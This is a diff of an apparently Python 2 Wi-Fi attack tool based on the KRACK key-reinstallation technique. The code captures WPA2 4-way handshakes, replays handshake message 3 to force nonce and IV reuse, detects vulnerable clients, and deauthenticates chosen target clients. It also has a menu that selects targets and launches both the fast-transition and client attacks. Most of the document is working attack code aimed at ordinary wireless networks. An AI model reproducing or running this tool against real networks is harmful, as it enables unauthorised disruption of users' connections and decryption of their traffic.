@@ -207,12 +207,7 @@ class AttackClient():
 				"Client (re)installs an all-zero key in the 4-way handshake (this is very bad).") % (self.mac, iv, seq), color="red")
 			
 		self.vuln_4way = True
-	#replay time intervals control	
-	def start_replay(self):
 		
-		self.next_replay = time.time() + 1
-	
-	
 	#### NOTE This function filter wireless traffic
 	#### TODO For MITM it needs working threading/multiprocessing 
 	def handle_mon_rx(self):
@@ -302,19 +297,19 @@ class AttackClient():
 			# if fullhandshake recorded
 			if (self.tracking[STA]['frame1'] and self.tracking[STA]['frame2'] and self.tracking[STA]['frame3'] and self.tracking[STA]['frame4']):
 
+				#print( RED + '''\n\n 4-way Handshake Detected''')
 				log(INFO, ("\n\n\t\tHandshake Found\n\n"), color="green")
 
 				#NOTE STORES 4-WAY to pcap			
 				#wrpcap ("/root/Desktop/a.pcap", self.tracking[STA]['packets'])
 				
-				# Replay attack start 
-				self.start_replay()
+				#FIXME Flush
+				self.tracking[STA]['frame1'] = None
+				self.tracking[STA]['frame2'] = None
+				self.tracking[STA]['frame3'] = None
+				self.tracking[STA]['frame4'] = None	
 
-			#FIXME Flush
-			self.tracking[STA]['frame1'] = None
-			self.tracking[STA]['frame2'] = None
-			self.tracking[STA]['frame3'] = None
-			self.tracking[STA]['frame4'] = None
+			
 		####		
 				
 		#### CODE REFFERENCE: https://github.com/vanhoefm/krackattacks-scripts/blob/research/krackattack/krack-test-client.py
@@ -331,12 +326,11 @@ class AttackClient():
 			if self.ivs.is_iv_reused(p):
 				#TODO Store reused packets to pcap
 				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
-					"Client " + STA+ " is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
+					"Client is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
 
 				self.detected = True
 
-			self.track_used_iv(p)
-		
+			self.track_used_iv(p)	
 
 	def run(self):
 
@@ -349,13 +343,13 @@ class AttackClient():
 			if self.messageThree and self.messageOne and time.time() > self.next_replay:
 				
 				#TODO Make option to replay sole message 3 	
-				self.sock_ap.send(self.messageOne)
-				time.sleep(0.7)
-				log(INFO, "Replaying messge 1 and 3. Number:"+ str(self.c))			
+				#self.sock_ap.send(self.messageOne)
+				#time.sleep(0.5)
+				#log(INFO, "Replaying messge 1 and 3. Number:"+ str(self.c))			
 				self.sock_ap.send(self.messageThree)
-				#log(INFO, "Replaying messge 3. Number:" + str(self.c))
-				self.next_replay = time.time() + 1
+				log(INFO, "Replaying messge 3. Number:" + str(self.c))				
 				self.c +=1
+				self.next_replay = time.time() + 2
 			if self.detected:
 					log(WARNING, ("\n\n\t\tIV reuse detected\n\n"))
 					raw_input("\n\n\n Press Enter to continue...")
@@ -595,7 +589,7 @@ def rescan_with_station(station,intfmon,selectedInterface ):
 		# FIXME !!!!! this needs subproccess for faster output | coudlnt get Popen to work from the terminal, works wine from IDE
 		# change number of seconds for better results			
 		cmd_airodump = pexpect.spawn('airodump-ng '+intfmon+' --bssid \''+bssid+'\' --essid \''+essid+'\' --output-format csv -w ./scanfiles/Clientsscan --channel '+channel)
-		cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 35)
+		cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 20)
 		cmd_airodump.close()		
 	except OSError as e:
 		print "Could not perfroem scan with %s device" %intfmon
@@ -1131,10 +1125,10 @@ def main():
 			station = select_station()
 			bssid, essid, channel = rescan_with_station(station,wlanXmon,selectedInterface) #Select Target Roaming 
 			print_clients(bssid, essid, channel)
-			target_client = select_client()
-			target_mac= get_Target_Mac(target_client) #Select Target Client
+			tar_client = select_client()
+			tar_mac= get_Target_Mac(tar_client) #Select Target Client
 			monitor_channel(channel,wlanXmon,selectedInterface)
-			attackFT = FT(selectedInterface, wlanXmon, target_mac) #Start Attack 
+			attackFT = FT(selectedInterface, wlanXmon, tar_mac) #Start Attack 
 			attackFT.run()
 			makeMonitor(selectedInterface)
 			#MAKE SOME MAGIC AND GET THE DECRYPTION KEY FROM REUSED PACKETS
@@ -1146,12 +1140,12 @@ def main():
 			station = select_station()
 			bssid, essid, channel = rescan_with_station(station,wlanXmon,selectedInterface) # Select Target Access Point 
 			print_clients(bssid, essid, channel)
-			target_client = select_client()   # Select Target client 
-			target_mac= get_Target_Mac(target_client)
+			tar_client = select_client()   # Select Target client 
+			tar_mac= get_Target_Mac(tar_client)
 			monitor_channel(channel,wlanXmon,selectedInterface)
 			maininterface_channel(channel,selectedInterface)
-			deauth_client(target_mac,wlanXmon,bssid) # Deauthenticate Targets
-			attackAT = AttackClient(selectedInterface, wlanXmon, target_mac, bssid)	
+			deauth_client(tar_mac,wlanXmon,bssid) # Deauthenticate Targets
+			attackAT = AttackClient(selectedInterface, wlanXmon, tar_mac, bssid)	
 			attackAT.run() # Start Attack
 			#MAKE SOME MAGIC AND GET THE DECRYPTION KEY FROM REUSED PACKETS
 			maininterface_reset(selectedInterface)
